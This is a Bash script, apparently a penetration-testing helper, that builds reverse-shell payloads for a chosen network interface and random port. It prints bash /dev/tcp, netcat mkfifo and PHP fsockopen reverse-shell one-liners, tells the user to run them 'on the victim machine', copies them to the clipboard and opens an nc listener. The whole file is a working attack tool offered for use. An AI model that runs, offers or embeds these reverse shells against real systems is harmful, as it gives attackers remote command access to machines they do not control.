#!/bin/bash
script="$0"
port=$((4444 + $RANDOM % 5555))
#Declare the number of mandatory args
margs=2

# Common functions - BEGIN
function example {
    echo -e "Example: $script -i eth0 -s bash"
}

function usage {
    echo -e "Usage: $script INTERFACE [selected_interface] SHELL [selected_shell] \n"
}

function help {
    echo -e "\nREQUIREMENTS:"
    echo -e "This script requires xclip to function properly. If not present in the system, \
install it with 'sudo apt install xclip' command\n"
  usage
    echo -e "MANDATORY:"
    echo -e "  -i, --interface        The network iterface you wish to use"
    echo -e "  -s, --shell            The kind of shell you want to generate\n"
    echo -e "OPTION:"
    echo -e "  -h, --help             Prints this help\n"
    echo -e "SUPPORTED PARAMETERS:"
    echo -e "  eth0, tun0, ecc        Only active interfaces are supported"
    echo -e "  nc, bash, php          Use nc for netcat shell, use bash for bash tcp shell\n"
  example
}

# Ensures that the number of passed args are at least equals
# to the declared number of mandatory args.
# It also handles the special case of the -h or --help arg.
function margs_precheck {
  if [ $2 ] && [ $1 -lt $margs ]; then
    if [ $2 == "--help" ] || [ $2 == "-h" ]; then
      help
      exit
    else
        help
        exit 1 # error
    fi
  fi
}

# Ensures that all the mandatory args are not empty
function margs_check {
  if [ $# -lt $margs ]; then
      help
      exit 1 # error
  fi
}
# Common functions - END

# Custom functions - BEGIN
# Put here your custom functions
# Custom functions - END

# Main
margs_precheck $# $1

marg0=
marg1=

# Args while-loop
while [ "$1" != "" ];
do
   case $1 in
   -i  | --interface )  shift
                          marg0=$1
                      ;;
   -s  | --shell )  shift
                marg1=$1
                    ;;
   -h   | --help )        help
                          exit
                          ;;
   *)                     
                          echo "$script: illegal option $1"
                          help
                          exit 1 # error
                          ;;
    esac
    shift
done

# Pass here your mandatory args for check
margs_check $marg0 $marg1

# Shell function
echo "[PORT] Port number: $port"
ifconfig $marg0 | grep inet | awk '{print $2}' | head -n 1 > .ip.txt
#cat .ip.txt #Test grabbed IP
if [ "$marg1" = "bash" ]; then
    while read i; do exist=$i; done < .ip.txt;
      if [ -z "$exist" ]; then
        echo "[-] Network interface not found";
        echo "[-] Append the network interface you wish to use";
        echo "[-] Make sure the network interface exists!";
        rm .ip.txt;
        exit 1
      else
        echo "[+] Generating shells with $adapter as the network adapter.";
        echo "[+] Use one of the shell below on the victim machine.";
        while read line; do printf "[+] Bash TCP\nbash -c 'bash -i >& /dev/tcp/$line/$port 0>&1'\n"; #Bash revshell
        echo -n "bash -c 'bash -i >& /dev/tcp/$line/$port 0>&1'" | xclip -selection clipboard; done < .ip.txt;
        echo "[+] Shell copied in clipboard";
        echo "[+] Opening listener into a new window";
        nc -lnvp $port;
        rm .ip.txt;
        exit 1
      fi
elif [ "$marg1" = "nc" ]; then
    while read i; do exist=$i; done < .ip.txt;
      if [ -z "$exist" ]; then
        echo "[-] Network interface not found";
        echo "[-] Append the network interface you wish to use";
        echo "[-] Make sure the network interface exists!";
        rm .ip.txt;
        exit 1
      else
        echo "[+] Generating shells with $adapter as the network adapter.";
        echo "[+] Use one of the shell below on the victim machine.";
        while read line; do printf "[+] NC Shell\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $line $port >/tmp/f\n"; #NC revshell
        echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $line $port >/tmp/f" | xclip -selection clipboard; done < .ip.txt;
        echo "[+] Shell copied in clipboard";
        echo "[+] Opening listener into a new window";
        nc -lnvp $port;
        rm .ip.txt;
        exit 1
      fi
elif [ "$marg1" = "php" ]; then
    while read i; do exist=$i; done < .ip.txt;
      if [ -z "$exist" ]; then
        echo "[-] Network interface not found";
        echo "[-] Append the network interface you wish to use";
        echo "[-] Make sure the network interface exists!";
        rm .ip.txt;
        exit 1
      else
        echo "[+] Generating shells with $adapter as the network adapter.";
        echo "[+] Use one of the shell below on the victim machine.";
        while read line; do printf "[+] Shell php -r '$""sock=fsockopen(\"$line\",$port);$proc=proc_open(\"/bin/bash -i\", array(0=>$""sock, 1=>$""sock, 2=>$""sock),$""pipes);'\n"; #php revshell
        echo "php -r '$""sock=fsockopen(\"$line\",$port);$proc=proc_open(\"/bin/bash -i\", array(0=>$""sock, 1=>$""sock, 2=>$""sock),$""pipes);'" | xclip -selection clipboard; done < .ip.txt;
        echo "[+] Shell copied in clipboard";
        echo "[+] Opening listener into a new window";
        nc -lnvp $port;
        rm .ip.txt;
        exit 1
      fi
else
  echo "[-] Option not supported";
  rm .ip.txt
  help
  exit 1
fi
